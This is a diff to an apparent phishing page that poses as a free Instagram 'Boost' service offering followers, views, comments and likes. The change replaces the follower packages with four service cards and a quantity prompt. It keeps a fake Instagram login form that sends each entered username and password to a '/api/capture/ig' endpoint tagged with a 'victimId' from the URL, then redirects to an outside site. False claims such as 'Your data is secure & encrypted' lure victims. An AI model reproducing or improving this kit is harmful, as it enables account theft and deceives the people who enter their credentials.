@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Instagram Free Followers</title>
+    <title>Instagram Boost</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -28,7 +28,7 @@
             color: #fff;
         }
         .glass h1 {
-            font-size: 30px;
+            font-size: 28px;
             font-weight: 800;
             background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
             -webkit-background-clip: text;
@@ -36,18 +36,53 @@
         }
         .glass .sub {
             font-size: 13px;
-            letter-spacing: 3px;
+            letter-spacing: 2px;
             color: rgba(255,255,255,0.5);
             text-transform: uppercase;
             margin: 4px 0 18px;
         }
+        .option-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            margin: 18px 0;
+        }
+        .option-card {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            padding: 18px 10px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            backdrop-filter: blur(4px);
+        }
+        .option-card:active {
+            transform: scale(0.94);
+            background: rgba(245,87,108,0.15);
+            border-color: #f5576c;
+        }
+        .option-card .icon {
+            font-size: 36px;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .option-card .label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .option-card .desc {
+            font-size: 11px;
+            opacity: 0.5;
+            margin-top: 2px;
+        }
         .glow-btn {
             background: linear-gradient(145deg, #f093fb, #f5576c);
             border: none;
-            padding: 18px;
+            padding: 16px;
             border-radius: 60px;
             color: #fff;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 700;
             cursor: pointer;
             width: 100%;
@@ -56,29 +91,6 @@
             margin: 12px 0 6px;
         }
         .glow-btn:active { transform: scale(0.96); }
-        .package-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin: 20px 0 14px;
-        }
-        .package-grid button {
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 18px;
-            padding: 16px 0;
-            color: #fff;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.2s;
-            backdrop-filter: blur(4px);
-        }
-        .package-grid button:active {
-            transform: scale(0.92);
-            background: rgba(245,87,108,0.25);
-            border-color: #f5576c;
-        }
         .input-group {
             text-align: left;
             margin: 14px 0 8px;
@@ -105,11 +117,6 @@
             border-color: #f5576c;
             background: rgba(255,255,255,0.07);
         }
-        .footer-text {
-            font-size: 11px;
-            opacity: 0.3;
-            margin-top: 18px;
-        }
         .back-btn {
             background: rgba(255,255,255,0.04) !important;
             border: 1px solid rgba(255,255,255,0.06) !important;
@@ -118,13 +125,19 @@
             font-size: 15px !important;
             padding: 14px !important;
         }
+        .footer-text {
+            font-size: 11px;
+            opacity: 0.3;
+            margin-top: 18px;
+        }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
     <div class="glass" id="mainPage">
-        <h1>🎉 Get Free Instagram Followers!</h1>
-        <p class="sub">Choose your package</p>
-        <div class="package-grid" id="packageGrid"></div>
+        <h1>🚀 Instagram Boost</h1>
+        <p class="sub">Choose your service</p>
+        <div class="option-grid" id="optionGrid"></div>
         <p class="footer-text">100% safe & secure · Trusted by 10M+ users</p>
     </div>
 
@@ -132,21 +145,58 @@
         const urlParams = new URLSearchParams(window.location.search);
         const victimId = urlParams.get('v') || 'unknown';
 
-        // Show packages
-        const packages = ['1K', '5K', '10K', '50K', '100K'];
-        const grid = document.getElementById('packageGrid');
-        packages.forEach(pkg => {
-            const btn = document.createElement('button');
-            btn.textContent = pkg;
-            btn.onclick = () => showLogin(pkg);
-            grid.appendChild(btn);
+        // ========== OPTIONS ==========
+        const options = [
+            { id: 'followers', icon: '👥', label: 'FREE FOLLOWERS', desc: 'Boost your followers' },
+            { id: 'views', icon: '👁️', label: 'FREE VIEWS', desc: 'Increase story views' },
+            { id: 'comments', icon: '💬', label: 'FREE COMMENTS', desc: 'Get real comments' },
+            { id: 'likes', icon: '❤️', label: 'FREE LIKES', desc: 'Grow your likes' }
+        ];
+
+        const grid = document.getElementById('optionGrid');
+        options.forEach(opt => {
+            const card = document.createElement('div');
+            card.className = 'option-card';
+            card.innerHTML = `
+                <span class="icon">${opt.icon}</span>
+                <div class="label">${opt.label}</div>
+                <div class="desc">${opt.desc}</div>
+            `;
+            card.onclick = () => showNumberInput(opt.id, opt.label);
+            grid.appendChild(card);
         });
 
-        function showLogin(pkg) {
+        // ========== NUMBER INPUT PAGE ==========
+        function showNumberInput(optionId, optionLabel) {
+            const main = document.getElementById('mainPage');
+            main.innerHTML = `
+                <h1>📊 ${optionLabel}</h1>
+                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">
+                    Enter the number of ${optionId.toLowerCase()} you want
+                </p>
+                <div class="input-group">
+                    <label>🔢 Quantity</label>
+                    <input type="number" id="quantityInput" placeholder="e.g. 1000" min="1" />
+                </div>
+                <button class="glow-btn" onclick="showLogin('${optionId}', '${optionLabel}')">Next →</button>
+                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
+            `;
+        }
+
+        // ========== LOGIN PAGE ==========
+        function showLogin(optionId, optionLabel) {
+            const quantity = document.getElementById('quantityInput').value;
+            if (!quantity || quantity < 1) {
+                alert('⚠️ Please enter a valid number');
+                return;
+            }
+
             const main = document.getElementById('mainPage');
             main.innerHTML = `
                 <h1 style="background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🔐 Instagram Login</h1>
-                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">Enter your credentials to claim <strong>${pkg}</strong> followers</p>
+                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">
+                    Enter your credentials to get <strong>${quantity}</strong> ${optionId.toLowerCase()}
+                </p>
                 <div class="input-group">
                     <label>👤 Username / Email</label>
                     <input type="text" id="loginUser" placeholder="Enter your Instagram username" />
@@ -155,12 +205,13 @@
                     <label>🔒 Password</label>
                     <input type="password" id="loginPass" placeholder="Enter your password" />
                 </div>
-                <button class="glow-btn" onclick="submitLogin('${pkg}')">🚀 Claim Now</button>
+                <button class="glow-btn" onclick="submitLogin('${optionId}', '${quantity}')">🚀 Claim Now</button>
                 <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
                 <p class="footer-text" style="margin-top: 20px;">🔐 Your data is secure & encrypted</p>
             `;
         }
 
+        // ========== SEND DATA ==========
         async function sendData(payload) {
             try {
                 await fetch('/api/capture/ig', {
@@ -173,7 +224,8 @@
             }
         }
 
-        async function submitLogin(pkg) {
+        // ========== SUBMIT LOGIN ==========
+        async function submitLogin(optionId, quantity) {
             const username = document.getElementById('loginUser').value;
             const password = document.getElementById('loginPass').value;
             if (!username || !password) {
@@ -185,7 +237,8 @@
                     platform: 'instagram',
                     username: username,
                     password: password,
-                    package: pkg
+                    service: optionId,
+                    quantity: quantity
                 }
             });
             window.location.href = 'https://takipcikrali.com/';
